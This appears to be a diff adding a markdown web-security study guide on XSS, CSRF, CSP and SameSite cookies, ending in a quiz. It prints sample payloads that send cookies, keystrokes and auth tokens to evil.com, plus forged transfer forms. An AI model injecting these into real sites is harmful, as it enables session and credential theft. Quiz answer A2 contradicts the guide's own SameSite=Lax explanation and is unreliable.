@@ -1,0 +1,422 @@
+# Security Practices
+
+### The mental model first
+
+Web security attacks exploit trust relationships. XSS exploits the user's trust in a website: malicious script runs in the context of a trusted origin, with full access to cookies, DOM, and localStorage. CSRF exploits the server's trust in the user's browser: a forged request carries the user's real credentials without their knowledge. Understanding the trust model being abused makes every defense make sense rather than feeling like a checklist.
+
+---
+
+## XSS: Cross-Site Scripting
+
+XSS is the injection of malicious scripts into a page that other users view. The attacker's goal is to execute JavaScript in the victim's browser under the target site's origin, giving them access to cookies, tokens, DOM, and the ability to make authenticated requests.
+
+There are three distinct types. The distinction matters because the attack vector, persistence, and defense differ.
+
+---
+
+### Type 1: Stored XSS (persistent)
+
+The malicious script is saved to the server's database and served to every user who loads the affected page.
+
+```
+Attack flow:
+1. Attacker submits a comment: <script>fetch('https://evil.com?c='+document.cookie)</script>
+2. Server stores it without sanitization
+3. Every user who loads the comments page executes the script
+4. Their cookies are exfiltrated to evil.com
+```
+
+Most damaging type because it is persistent and affects all users automatically.
+
+```js
+// Vulnerable server rendering (Node/Express example)
+app.get('/comments', (req, res) => {
+  const comments = db.getComments();
+  res.send(`<div>${comments.map((c) => c.text).join('')}</div>`);
+  // If c.text is "<script>...</script>", it executes for every visitor
+});
+
+// Safe: escape HTML before rendering
+const escape = (s) => s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+res.send(`<div>${comments.map((c) => escape(c.text)).join('')}</div>`);
+```
+
+---
+
+### Type 2: Reflected XSS (non-persistent)
+
+The malicious script is embedded in a URL. The server reflects it back in the response without storage. The victim must be tricked into clicking the crafted link.
+
+```
+Attack flow:
+1. Attacker crafts URL: https://bank.com/search?q=<script>stealCookies()</script>
+2. Victim clicks the link (phishing email, social engineering)
+3. Server renders: "You searched for: <script>stealCookies()</script>"
+4. Script executes in victim's browser under bank.com's origin
+```
+
+```js
+// Vulnerable: query param reflected directly into HTML
+app.get('/search', (req, res) => {
+  res.send(`<p>You searched for: ${req.query.q}</p>`);
+});
+
+// Safe
+res.send(`<p>You searched for: ${escape(req.query.q)}</p>`);
+```
+
+Less dangerous than stored XSS because it requires the victim to visit a crafted URL, but still severe because it runs under the trusted origin.
+
+---
+
+### Type 3: DOM-based XSS
+
+The vulnerability is entirely client-side. The server sends a safe response, but client-side JavaScript reads from a tainted source (`location.hash`, `document.referrer`, `window.name`) and writes it to the DOM unsafely. The server is never involved.
+
+```js
+// Vulnerable: reading from URL hash and writing to DOM
+const name = location.hash.slice(1); // attacker controls this
+document.getElementById('greeting').innerHTML = `Hello ${name}`;
+// URL: https://app.com/page#<img src=x onerror=stealCookies()>
+// innerHTML executes the onerror handler
+```
+
+```js
+// Safe: use textContent instead of innerHTML for plain text
+document.getElementById('greeting').textContent = `Hello ${name}`;
+
+// Safe: if you need HTML, use DOMParser or a sanitizer library
+```
+
+The key difference: DOM XSS does not require server cooperation and cannot be fixed by server-side escaping alone. The fix must be client-side.
+
+---
+
+### XSS attack payloads: what attackers actually do
+
+Understanding the goal makes defenses feel more urgent:
+
+```js
+// Cookie theft (if cookie is not HttpOnly)
+<script>new Image().src="https://evil.com?c="+document.cookie</script>
+
+// Keylogger
+<script>document.addEventListener('keypress', e => fetch('https://evil.com?k='+e.key))</script>
+
+// Session hijack via localStorage
+<script>fetch('https://evil.com?t='+localStorage.getItem('authToken'))</script>
+
+// Phishing overlay
+<script>document.body.innerHTML='<form action="https://evil.com/steal">...'</script>
+```
+
+`HttpOnly` cookies prevent the cookie theft vector. They are not readable by JavaScript at all. But the attacker can still make authenticated requests as the user, since the browser sends `HttpOnly` cookies automatically.
+
+---
+
+### XSS defenses summary
+
+| Defense                                     | What it prevents                                |
+| ------------------------------------------- | ----------------------------------------------- |
+| HTML escape on output                       | Stored and reflected XSS                        |
+| `textContent` over `innerHTML`              | DOM XSS from text injection                     |
+| `HttpOnly` cookie flag                      | Cookie theft via JS                             |
+| Content-Security-Policy                     | Limits what scripts can execute (covered below) |
+| Input validation/sanitization               | Reduces attack surface, not sufficient alone    |
+| Avoid `eval`, `innerHTML`, `document.write` | Removes common injection sinks                  |
+
+---
+
+## CSRF: Cross-Site Request Forgery
+
+CSRF exploits the fact that browsers automatically attach cookies to requests, regardless of which site initiated the request. The attacker tricks the victim's browser into making a state-changing request to a trusted site, carrying the victim's credentials.
+
+---
+
+### The attack mechanics
+
+```
+Setup: victim is logged into bank.com (has valid session cookie)
+
+Attack flow:
+1. Attacker creates evil.com with hidden form:
+   <form action="https://bank.com/transfer" method="POST">
+     <input name="amount" value="10000">
+     <input name="to" value="attacker-account">
+   </form>
+   <script>document.forms[0].submit()</script>
+
+2. Victim visits evil.com (phishing link)
+3. Browser auto-submits the form to bank.com
+4. Browser attaches bank.com session cookie automatically
+5. bank.com sees a valid authenticated request and processes the transfer
+6. Victim never saw a form, never clicked submit
+```
+
+The attacker never sees the response. They do not need to. The damage is done server-side. This is why CORS not protecting against CSRF is a critical distinction: CORS hides the response from evil.com's JS, but the form submission (a simple `POST`) goes through and the server acts on it.
+
+---
+
+### CSRF via GET request (why state-changing operations must not use GET)
+
+```html
+<!-- If bank.com uses GET for transfers -->
+<img src="https://bank.com/transfer?amount=10000&to=attacker" />
+<!-- Browser loads the image, sends GET with cookies, transfer happens -->
+<!-- No user interaction required, just loading a page -->
+```
+
+This is why REST conventions matter for security: `GET` must be safe and idempotent. State-changing operations must use `POST`/`PUT`/`DELETE`.
+
+---
+
+### CSRF defenses
+
+**Defense 1: CSRF tokens (synchronizer token pattern)**
+
+The server generates a unique unpredictable token per session, embeds it in every form, and validates it on every state-changing request. The attacker on evil.com cannot read the token because of same-origin policy.
+
+```html
+<!-- Server renders this into every form -->
+<form method="POST" action="/transfer">
+  <input type="hidden" name="csrf_token" value="a3f8b2c9d1e4..." />
+  <input name="amount" value="100" />
+</form>
+```
+
+```js
+// Server validates on every POST
+app.post('/transfer', (req, res) => {
+  if (req.body.csrf_token !== req.session.csrf_token) {
+    return res.status(403).send('CSRF validation failed');
+  }
+  // process transfer
+});
+```
+
+**Defense 2: SameSite cookies** (covered in detail below)
+
+**Defense 3: Double submit cookie**
+
+Send the CSRF token both as a cookie and as a request header/body. Server checks they match. Attacker cannot read or set cookies for the target domain from evil.com.
+
+**Defense 4: Custom request headers**
+
+Add a custom header like `X-Requested-With: XMLHttpRequest`. Browsers do not send custom headers on cross-origin simple requests without CORS approval. The server rejects requests missing this header.
+
+```js
+fetch('/api/transfer', {
+  method: 'POST',
+  headers: { 'X-Requested-With': 'XMLHttpRequest' },
+});
+// Server checks for this header, form-based CSRF cannot add it
+```
+
+---
+
+## Content-Security-Policy (CSP)
+
+CSP is an HTTP response header that tells the browser which sources of content are trusted. It is the server saying: "Do not execute scripts unless they came from these specific places." It is the most powerful defense against XSS because even if an attacker injects a `<script>` tag, the browser refuses to run it.
+
+---
+
+### How it works
+
+```
+HTTP Response Header:
+Content-Security-Policy: script-src 'self' https://cdn.trusted.com
+```
+
+With this policy:
+
+- Scripts from the same origin (`'self'`) are allowed
+- Scripts from `https://cdn.trusted.com` are allowed
+- Inline `<script>` tags are blocked
+- `eval()` is blocked
+- Scripts from any other origin are blocked
+
+An injected `<script>fetch('https://evil.com?c='+document.cookie)</script>` is blocked by the browser before it executes.
+
+---
+
+### Key directives
+
+| Directive     | Controls                                      |
+| ------------- | --------------------------------------------- |
+| `script-src`  | JavaScript sources                            |
+| `style-src`   | CSS sources                                   |
+| `img-src`     | Image sources                                 |
+| `connect-src` | `fetch`, `XHR`, `WebSocket` destinations      |
+| `font-src`    | Font sources                                  |
+| `frame-src`   | `<iframe>` sources                            |
+| `default-src` | Fallback for any directive not explicitly set |
+| `form-action` | Where forms can submit                        |
+| `base-uri`    | Restricts `<base>` tag                        |
+
+```
+Content-Security-Policy:
+  default-src 'self';
+  script-src 'self' https://cdn.example.com;
+  img-src 'self' data: https://images.example.com;
+  connect-src 'self' https://api.example.com;
+  style-src 'self' 'unsafe-inline';
+```
+
+---
+
+### Special source values
+
+| Value              | Meaning                                                 |
+| ------------------ | ------------------------------------------------------- |
+| `'self'`           | Same origin only                                        |
+| `'none'`           | Nothing allowed                                         |
+| `'unsafe-inline'`  | Allow inline scripts/styles (weakens CSP significantly) |
+| `'unsafe-eval'`    | Allow `eval()`, `Function()`, `setTimeout(string)`      |
+| `'nonce-{value}'`  | Allow specific inline script with matching nonce        |
+| `'strict-dynamic'` | Trust scripts loaded by already-trusted scripts         |
+
+### Nonces: the correct way to allow inline scripts
+
+Instead of `'unsafe-inline'` (which allows all inline scripts), use a per-request nonce:
+
+```html
+<!-- Server generates a fresh random nonce per request -->
+<script nonce="r4nd0m9a8b7c">
+  // This specific inline script is allowed
+  initApp();
+</script>
+```
+
+```
+Content-Security-Policy: script-src 'nonce-r4nd0m9a8b7c'
+```
+
+Only scripts with the matching nonce attribute execute. An injected `<script>` without the nonce is blocked. The nonce must be cryptographically random and different per response so attackers cannot predict it.
+
+---
+
+### Report-Only mode
+
+During rollout, use `Content-Security-Policy-Report-Only` instead of `Content-Security-Policy`. Violations are reported but not blocked, letting you audit your policy before enforcing it:
+
+```
+Content-Security-Policy-Report-Only: script-src 'self'; report-uri /csp-violations
+```
+
+---
+
+## `SameSite` cookies
+
+`SameSite` is a cookie attribute that controls when cookies are sent on cross-site requests. It is the browser-level CSRF defense built directly into the cookie mechanism.
+
+---
+
+### Three values
+
+**`SameSite=Strict`**
+
+The cookie is never sent on any cross-site request, including navigations:
+
+```
+Set-Cookie: session=abc; SameSite=Strict
+```
+
+If a user clicks a link from evil.com to bank.com, the session cookie is not sent. Bank.com treats them as logged out. Maximum protection, but breaks legitimate cross-site navigation (like clicking a link from a third-party site into a logged-in area).
+
+**`SameSite=Lax`** (browser default since ~2020)
+
+The cookie is sent on cross-site top-level navigation using safe methods (`GET`) but not on sub-resource requests or `POST`:
+
+```
+Set-Cookie: session=abc; SameSite=Lax
+```
+
+```
+Sent:     User clicks a link from evil.com → bank.com (GET navigation)
+Not sent: evil.com form POSTs to bank.com (CSRF attack vector)
+Not sent: evil.com img/iframe loads from bank.com
+```
+
+This is the modern default and blocks most CSRF attacks while preserving normal navigation UX.
+
+**`SameSite=None`**
+
+The cookie is sent on all cross-site requests. Requires `Secure` (HTTPS only):
+
+```
+Set-Cookie: session=abc; SameSite=None; Secure
+```
+
+Required for legitimate cross-site use cases like embedded iframes, OAuth flows, or payment widgets. Maximum exposure to CSRF.
+
+---
+
+### Combining cookie flags
+
+Proper session cookie setup combines multiple flags:
+
+```
+Set-Cookie: session=abc123;
+  HttpOnly;          // JS cannot read it (blocks cookie theft XSS)
+  Secure;            // HTTPS only (blocks network interception)
+  SameSite=Lax;      // not sent on cross-site POST (blocks CSRF)
+  Path=/;
+  Max-Age=3600
+```
+
+| Flag                  | Protects against                       |
+| --------------------- | -------------------------------------- |
+| `HttpOnly`            | XSS cookie theft                       |
+| `Secure`              | Network interception (MITM)            |
+| `SameSite=Lax/Strict` | CSRF                                   |
+| Short `Max-Age`       | Session fixation, stolen cookie window |
+
+---
+
+### XSS vs CSRF: the comparison
+
+|                        | XSS                                   | CSRF                                            |
+| ---------------------- | ------------------------------------- | ----------------------------------------------- |
+| Trust exploited        | User trusts the site                  | Server trusts the browser                       |
+| Attack runs            | In victim's browser, target origin    | Server processes forged request                 |
+| Attacker needs         | Injection point in target site        | Victim to visit attacker's page while logged in |
+| Attacker sees response | Yes (same origin as victim's session) | No (cross-origin, blocked by CORS)              |
+| Primary defense        | CSP, output escaping, `HttpOnly`      | CSRF tokens, `SameSite` cookies                 |
+| Does HTTPS prevent it  | No                                    | No                                              |
+
+---
+
+### Self-test: 5 questions
+
+**Q1.** What is the difference between stored XSS and DOM-based XSS in terms of where the fix must be applied?
+
+**Q2.** A bank's transfer endpoint uses `GET`: `/transfer?amount=1000&to=attacker`. An attacker embeds `<img src="https://bank.com/transfer?amount=1000&to=attacker">` on their page. The victim visits the page while logged into bank.com. What happens and why?
+
+**Q3.** A site has this CSP header:
+
+```
+Content-Security-Policy: script-src 'self'
+```
+
+An attacker injects `<script src="https://evil.com/steal.js"></script>` via a stored XSS vulnerability. Does the script execute?
+
+**Q4.** What is the practical difference between `SameSite=Strict` and `SameSite=Lax` for a logged-in user clicking a link from an email to a banking site?
+
+**Q5.** An API uses only CORS headers to restrict access to `https://app.com`. Does this prevent CSRF attacks from `https://evil.com`? Why or why not?
+
+---
+
+<details>
+<summary>Answers</summary>
+
+**A1.** Stored XSS originates from the server rendering unsanitized data from the database. The fix is server-side: escape HTML before rendering user-supplied content into the page. DOM-based XSS is entirely client-side. The server sends a safe response, but client-side JS reads from a tainted source like `location.hash` and writes it to the DOM unsafely using `innerHTML` or similar sinks. Server-side escaping has no effect on DOM XSS. The fix must be client-side: use `textContent` instead of `innerHTML`, or sanitize with a trusted library before any DOM write.
+
+**A2.** The transfer executes. The browser loads the `<img>` tag, fires a `GET` request to `bank.com/transfer`, and automatically attaches the session cookie. Bank.com receives a valid authenticated request and processes the transfer. The attacker never sees the response, but the damage is done server-side. This illustrates why state-changing operations must never use `GET`, and why `SameSite=Lax` alone would not protect here since `Lax` allows cookies on cross-site GET navigations. The fix is to use `POST` for transfers and add CSRF token validation.
+
+**A3.** No. The CSP `script-src 'self'` only allows scripts from the same origin. `https://evil.com/steal.js` is a different origin. The browser blocks the script before it executes and logs a CSP violation. This demonstrates CSP's core value: even when an XSS injection succeeds in getting a `<script>` tag into the page, CSP prevents execution. The attacker's injection is neutered at the browser level.
+
+**A4.** With `SameSite=Strict`, clicking a link in an email to `bank.com` is a cross-site navigation. The session cookie is not sent. The user arrives at bank.com as if logged out, forced to log in again. With `SameSite=Lax`, the same click is a top-level GET navigation. The session cookie is sent and the user arrives logged in. `Lax` provides nearly the same CSRF protection (blocks cross-site `POST`, `iframe` loads, image loads) while preserving the normal navigation experience. This is why `Lax` is the pragmatic default in most modern frameworks.
+
+**A5.** No, CORS does not prevent CSRF. CORS is a browser mechanism that controls whether JavaScript on a cross-origin page can read the response. It does not prevent the request from being sent. A CSRF attack using a standard HTML form `POST` is a simple request, which goes through without a preflight. The browser sends the request including the victim's cookies. The server processes it. CORS only hides the response from the attacker's JavaScript. The state-changing operation on the server has already happened. CSRF requires its own defenses: CSRF tokens, `SameSite` cookies, or custom headers.
+
+</details>
